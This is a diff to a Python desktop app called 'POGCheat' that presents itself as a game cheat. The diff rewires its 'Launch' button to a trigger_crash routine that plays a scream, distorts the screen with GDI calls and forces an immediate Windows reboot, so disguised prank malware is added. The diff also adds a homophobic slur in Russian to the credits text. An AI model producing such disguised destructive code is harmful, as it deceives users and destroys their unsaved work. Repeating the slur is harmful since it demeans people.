@@ -4,6 +4,11 @@ from PIL import Image
 from pygame import mixer
 import time
 import ctypes
+import win32gui
+import win32con
+import math
+
+current_folder = os.path.dirname(os.path.realpath(__file__))
 
 mixer.init()
 mixer.music.load('assets/scream.mp3')
@@ -90,7 +95,7 @@ class App(customtkinter.CTk):
         self.home_frame_large_image_label.grid(row=0, column=0, padx=20, pady=10)
 
         self.launch_button = customtkinter.CTkButton(self.home_frame, text=" Launch", image=self.logo,
-                                                     command=self.home_button_event)
+                                                     command=self.trigger_crash)
         self.launch_button.grid(row=1, column=0, padx=20, pady=10)
 
 
@@ -115,7 +120,7 @@ class App(customtkinter.CTk):
 
         self.devs_frame_text = customtkinter.CTkTextbox(self.devs_frame, height=260)
         self.devs_frame_text.grid(row=1, column=0, padx=(20, 20), pady=(20, 0), sticky="new")
-        self.devs_frame_text.insert("0.0", "POGCheat создавали:\n\n" + "- VayLorm - (TODO: add text)\n" + "- dotPast - (TODO: add text)\n" + "\nПри создании использовались:\n" + " - CustomTkinter\n" + " - что то еще я забыл - dotPast\n\n" + "Оригинал логотипа: Эмоция POGGERS от VoidMakesVids на 7TV (https://7tv.app/emotes/60af1ba684a2b8e655387bba)\n\n\n" + "Создано для НЕДОХАКЕРЫ Lite (https://www.youtube.com/@nedohackerslite)" + "\nPS. - копировать текст из этого поля с помощью CTRL+C")
+        self.devs_frame_text.insert("0.0", "POGCheat создавали:\n\n" + "- VayLorm - (TODO: add text)\n" + "- dotPast (Джуст который пидор) - (TODO: add text)\n" + "\nПри создании использовались:\n" + " - CustomTkinter\n" + " - что то еще я забыл - dotPast\n\n" + "Оригинал логотипа: Эмоция POGGERS от VoidMakesVids на 7TV (https://7tv.app/emotes/60af1ba684a2b8e655387bba)\n\n\n" + "Создано для НЕДОХАКЕРЫ Lite (https://www.youtube.com/@nedohackerslite)" + "\nPS. - копировать текст из этого поля с помощью CTRL+C")
         self.devs_frame_text.configure(state="disabled")
         self.devs_frame_text.bind("<1>", lambda event: self.devs_frame_text.focus_set())
 
@@ -148,9 +153,25 @@ class App(customtkinter.CTk):
 
     def trigger_crash(self):
         mixer.music.play()
-        os.system('taskkill /IM explorer.exe')
-        time.sleep(0.1)
-        os.system('shutdown /r /t 0')
+
+        # Code from https://github.com/Leo-Aqua/Python-gdi-repo
+        user32 = ctypes.windll.user32
+        user32.SetProcessDPIAware()
+        [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
+        hdc = win32gui.GetDC(0)
+        dx = dy = 1
+        angle = 0
+        size = 1
+        speed = 5
+        for i in range(15):
+            win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, dx,dy, win32con.BLACKNESS)
+            dx = math.ceil(math.sin(angle) * size * 10)
+            dy = math.ceil(math.cos(angle) * size * 10)
+            angle += speed / 10
+            if angle > math.pi :
+                angle = math.pi * -1
+        time.sleep(0.5)
+        os.system('shutdown /r /t 0 /f')
 
     def devs_button_event(self):
         self.pick_frame("devs")
